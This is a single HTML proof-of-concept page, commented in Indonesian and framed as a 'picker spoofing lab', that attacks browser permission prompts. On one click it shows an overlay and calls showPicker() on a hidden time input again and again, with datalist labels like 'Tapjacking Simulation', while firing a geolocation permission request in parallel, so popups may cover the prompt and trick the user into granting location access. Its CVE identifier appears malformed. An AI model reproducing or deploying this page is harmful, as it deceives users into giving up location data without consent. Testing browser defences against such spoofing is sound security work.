<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Advanced Heavy-Duty Picker Spoofing Lab (CVE-40067274 Context)</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 40px;
            background-color: #0d1117;
            color: #c9d1d9;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            cursor: pointer;
            overflow: hidden;
        }
        h1 {
            color: #f85149;
            font-size: 22px;
            margin-bottom: 10px;
        }
        .info-box {
            background: #161b22;
            border: 1px solid #30363d;
            padding: 15px;
            border-radius: 6px;
            max-width: 550px;
            width: 100%;
            font-size: 12px;
            color: #8b949e;
            margin-top: 20px;
            text-align: left;
            max-height: 200px;
            overflow-y: auto;
            font-family: monospace;
        }
        code { background: #21262d; color: #ff7b72; padding: 2px 5px; border-radius: 3px; }
        /* Simulasi elemen overlay penutup layar untuk uji lab */
        #overlay-layer {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.05);
            z-index: 9999;
            display: none;
            pointer-events: none;
        }
    </style>
</head>
<body>

    <div id="overlay-layer"></div>

    <h1>⚠️ Heavy-Duty Picker Spoofing Lab</h1>
    <p style="font-size: 13px; color: #8b949e;">Klik layar untuk menguji ketahanan token aktivasi dan batasan pemanggilan <code>showPicker()</code> berulang.</p>

    <!-- Elemen Input & Datalist Dinamis -->
    <input id="target-input" type="time" list="times" style="display:none;" />
    <datalist id="times">
        <select id="target-select">
            <option label="[!] Security Context Validation">00:00</option>
            <option label="⬇️ Overlay Alignment Test">00:00</option>
            <option label="⬇️ Tapjacking Simulation">00:00</option>
            <option label="⭕ Target Zone">00:00</option>
        </select>
    </datalist>

    <div class="info-box" id="log-box">
        [System] Lab siap. Menunggu gestur klik pengguna...
    </div>

<script>
    const logBox = document.getElementById('log-box');
    const overlay = document.getElementById('overlay-layer');

    function appendLog(msg, isError = false) {
        const timeStr = new Date().toISOString().split('T')[1].slice(0, 12);
        console.log(`[${timeStr}] ${msg}`);
        logBox.innerHTML += `<br><span style="color: ${isError ? '#f85149' : '#52bef8'}">[${timeStr}]</span> ${msg}`;
        logBox.scrollTop = logBox.scrollHeight;
    }

    function triggerPickerAttempt(index) {
        try {
            const inputEl = document.getElementById('target-input');
            
            // Penguatan: Memaksa pemanggilan metode showPicker secara langsung
            inputEl.showPicker();
            appendLog(`Sukses: showPicker() tereksekusi pada iterasi ke-${index}`);
        } catch (err) {
            appendLog(`Ditolak/Diblokir (Iterasi ${index}): ${err.name} - ${err.message}`, true);
        }
    }

    document.body.onclick = async () => {
        appendLog("Gestur klik terdeteksi (User Activation Sah). Memulai rangkaian uji...");
        
        // Mengaktifkan elemen overlay simulasi visual lab
        overlay.style.display = 'block';

        // Percobaan 1: Eksekusi instan di dalam siklus microtask / stack awal
        triggerPickerAttempt(1);

        // Percobaan 2: Pemanfaatan interval berkecepatan tinggi untuk menguji pembatasan ConsumeIfActive
        let counter = 2;
        const stressInterval = setInterval(() => {
            triggerPickerAttempt(counter);
            counter++;

            // Batasi hingga 8 kali percobaan agresif dalam rentang waktu singkat
            if (counter > 8) {
                clearInterval(stressInterval);
                appendLog("Uji stres interval selesai. Perhatikan penolakan NotAllowedError di atas.");
                overlay.style.display = 'none';
            }
        }, 100);

        // Memicu dialog izin sistem secara asinkron paralel
        try {
            navigator.geolocation.getCurrentPosition(
                (pos) => { appendLog("Callback Geolokasi: Diizinkan (" + pos.coords.latitude + ")"); },
                (err) => { appendLog("Callback Geolokasi: Ditolak/Error (" + err.message + ")", true); }
            );
        } catch (e) {
            appendLog("Error pada pemanggilan geolocation: " + e.message, true);
        }
    };
</script>

</body>
</html>
